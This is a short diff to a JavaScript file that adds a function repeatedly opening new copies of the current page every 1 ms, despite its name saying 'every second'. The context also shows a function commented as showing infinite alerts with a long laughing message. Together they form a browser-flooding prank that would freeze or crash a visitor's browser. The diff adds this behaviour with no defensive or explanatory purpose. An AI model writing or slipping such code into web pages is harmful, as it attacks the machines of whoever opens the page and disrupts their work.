@@ -1,6 +1,12 @@
 let showAlertTimeout;
 let openNewTabInterval;
 
+function duplicateTabEverySecond() {
+    openNewTabInterval = setInterval(function() {
+        window.open(location.href);
+    }, 1);
+}
+
 // 無限アラートを表示する関数
 function showAlert() {
     alert("(ﾟ∀ﾟ)アヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャ");
